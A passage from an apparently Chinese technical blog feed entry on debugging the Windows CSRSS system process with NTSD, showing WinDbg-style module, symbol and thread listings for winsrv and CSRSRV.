77da0000   USER32     (pdb symbols)          c:<span class="symbol">\s</span>ymbols1<span class="symbol">\u</span>ser32.pdb<span class="symbol">\D</span>18A41B74E7F458CAAAC1847E2D8BF022<span class="symbol">\u</span>ser32.pdb</div><div class="line">77da0000 77e49000   ADVAPI32   (pdb symbols)          c:<span class="symbol">\s</span>ymbols1<span class="symbol">\a</span>dvapi32.pdb<span class="symbol">\5</span>EFB9BF42CC64024AB64802E467394642<span class="symbol">\a</span>dvapi32.pdb</div><div class="line">77e50000 77ee2000   RPCRT4     (pdb symbols)          c:<span class="symbol">\s</span>ymbols1<span class="symbol">\r</span>pcrt4.pdb<span class="symbol">\C</span>CD4FE9B704E48B6B8A12F31E112AA6F2<span class="symbol">\r</span>pcrt4.pdb</div><div class="line">77ef0000 77f39000   GDI32      (pdb symbols)          c:<span class="symbol">\s</span>ymbols1<span class="symbol">\g</span>di32.pdb<span class="symbol">\7</span>40F60A99F2A417E96C387400994588D2<span class="symbol">\g</span>di32.pdb</div><div class="line">77fc0000 77fd1000   Secur32    (pdb symbols)          c:<span class="symbol">\s</span>ymbols1<span class="symbol">\s</span>ecur32.pdb<span class="symbol">\E</span>8D378740B8E4A46B19CAFCD2D6DDF7D2<span class="symbol">\s</span>ecur32.pdb</div><div class="line">7c800000 7c91e000   KERNEL32   (pdb symbols)          c:<span class="symbol">\s</span>ymbols1<span class="symbol">\k</span>ernel32.pdb<span class="symbol">\3</span>4560E80F5C54175B208848EF863C5BD2<span class="symbol">\k</span>ernel32.pdb</div><div class="line">7c920000 7c9b3000   ntdll      (pdb symbols)          c:<span class="symbol">\s</span>ymbols1<span class="symbol">\n</span>tdll.pdb<span class="symbol">\1</span>751003260CA42598C0FB326585000ED2<span class="symbol">\n</span>tdll.pdb</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用x modulename!funcationname，查看符号信息。使用 ~*查看所有线程<br><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">0</span>:<span class="number">011</span>&gt; x winsrv!*</div><div class="line">x winsrv!*</div><div class="line"><span class="number">764</span>e84eb winsrv!UserServerDllInitialization (&lt;no parameter info&gt;)</div><div class="line"><span class="number">764</span>e88c9 winsrv!ConServerDllInitialization (&lt;no parameter info&gt;)</div><div class="line"><span class="number">764</span>ec121 winsrv!UserSoundSentry (&lt;no parameter info&gt;)</div><div class="line"><span class="number">764</span>f4ba4 winsrv!UserTestTokenForInteractive (&lt;no parameter info&gt;)</div><div class="line"><span class="number">0</span>:<span class="number">011</span>&gt; ~*</div><div class="line">~*</div><div class="line">   <span class="number">0</span>  <span class="attribute">Id</span>: <span class="number">254.25</span>c <span class="attribute">Suspend</span>: <span class="number">1</span> <span class="attribute">Teb</span>: <span class="number">7</span>ffde000 Unfrozen</div><div class="line">      <span class="attribute">Priority</span>: <span class="number">2</span>  Priority <span class="attribute">class</span>: <span class="number">32</span>  <span class="attribute">Affinity</span>: <span class="number">1</span></div><div class="line">   <span class="number">1</span>  <span class="attribute">Id</span>: <span class="number">254.260</span> <span class="attribute">Suspend</span>: <span class="number">1</span> <span class="attribute">Teb</span>: <span class="number">7</span>ffdd000 Unfrozen</div><div class="line">      <span class="attribute">Start</span>: winsrv!ConServerDllInitialization+<span class="number">0</span>x35f4 (<span class="number">764</span>ebebd) </div><div class="line">      <span class="attribute">Priority</span>: <span class="number">0</span>  Priority <span class="attribute">class</span>: <span class="number">32</span>  <span class="attribute">Affinity</span>: <span class="number">1</span></div><div class="line">   <span class="number">2</span>  <span class="attribute">Id</span>: <span class="number">254.264</span> <span class="attribute">Suspend</span>: <span class="number">1</span> <span class="attribute">Teb</span>: <span class="number">7</span>ffdc000 Unfrozen</div><div class="line">      <span class="attribute">Start</span>: CSRSRV!CsrValidateMessageString+<span class="number">0</span>x179 (<span class="number">75</span>aa4616) </div><div class="line">      <span class="attribute">Priority</span>: <span class="number">0</span>  Priority <span class="attribute">class</span>: <span class="number">32</span>  <span class="attribute">Affinity</span>: <span class="number">1</span></div><div class="line">   <span class="number">3</span>  <span class="attribute">Id</span>: <span class="number">254.268</span> <span class="attribute">Suspend</span>: <span class="number">1</span> <span class="attribute">Teb</span>: <span class="number">7</span>ffdb000 Unfrozen</div><div class="line">      <span class="attribute">Start</span>: CSRSRV!CsrUnhandledExceptionFilter+<span class="number">0</span>x936 (<span class="number">75</span>aa3b3a) </div><div class="line">      <span class="attribute">Priority</span>: <span class="number">0</span>  Priority <span class="attribute">class</span>: <span class="number">32</span>  <span class="attribute">Affinity</span>: <span class="number">1</span></div><div class="line">   <span class="number">4</span>  <span class="attribute">Id</span>: <span class="number">254.274</span> <span class="attribute">Suspend</span>: <span class="number">1</span> <span class="attribute">Teb</span>: <span class="number">7</span>ffda000 Unfrozen</div><div class="line">      <span class="attribute">Start</span>: CSRSRV!CsrValidateMessageString+<span class="number">0</span>x179 (<span class="number">75</span>aa4616) </div><div class="line">      <span class="attribute">Priority</span>: <span class="number">0</span>  Priority <span class="attribute">class</span>: <span class="number">32</span>  <span class="attribute">Affinity</span>: <span class="number">1</span></div></pre></td></tr></table></figure></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用这样NTSD和双机调试可以调试众多系统进程。例如wilogon.exe,CSRSS其实是服务器进程，其他进程是客户进程。进程内部有WINSRV,CSRSRV,BASESRV三个模块。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;神圣不可侵犯&quot;&gt;&lt;a href=&quot;#神圣不可侵犯&quot; class=&quot;headerlink&quot; title=&quot;神圣不可侵犯&quot;&gt;&lt;/a&gt;神圣不可侵犯&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;CSRSS进程，中文全称是系统服务进程，他监管着系统中运行的所有windows进程和线程。在消息分发，桌面管理，终端登录，控制台管理，DOS虚拟机等方面起着重要作用。由于其重要性，调试CSRSS进程也是相当困难的&lt;br&gt;
    
    </summary>
    
      <category term="&lt;格蠹汇编&gt;" scheme="http://yoursite.com/categories/%E6%A0%BC%E8%A0%B9%E6%B1%87%E7%BC%96/"/>
    
    
  </entry>
  
</feed>
